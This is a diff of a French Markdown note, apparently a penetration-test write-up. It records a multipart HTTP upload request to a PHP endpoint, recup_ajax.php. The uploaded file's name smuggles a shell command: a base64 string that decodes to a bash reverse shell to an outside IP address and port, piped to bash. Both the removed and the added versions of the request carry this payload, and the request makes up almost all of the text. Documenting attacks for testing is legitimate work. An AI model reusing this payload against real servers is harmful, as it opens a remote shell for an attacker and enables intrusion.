@@ -131,19 +131,30 @@ Cette méthode peut être appelé côté client grace à une requête POST sur l
 POST /recup_ajax.php HTTP/1.1
 Host: exemple.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
+Cookie: PHPSESSID=xxxx
 
 ------WebKitFormBoundary7MA4YWxk
-Content-Disposition: form-data; name="champ_texte"
+Content-Disposition: form-data; name="fonction"
 
-Valeur du texte
+addFichiersEvenementChantier
 ------WebKitFormBoundary7MA4YWxk
-Content-Disposition: form-data; name="fichier"; filename="image.png; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash"
-Content-Type: image/png
+Content-Disposition: form-data; name="evenement"
 
 test
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="commentaires"
 
-------WebKitFormBoundary7MA4YWxk--   
-fonction=addFichiersEvenementChantier&&type=PLAN
+test
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="type"
+
+PLAN
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="fichiers[]"; filename="image.png\"; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash\".png"
+Content-Type: image/png
+
+AAAA
+------WebKitFormBoundary7MA4YWxk--
 ```
 
 ![[Pasted image 20260421154427.png]]
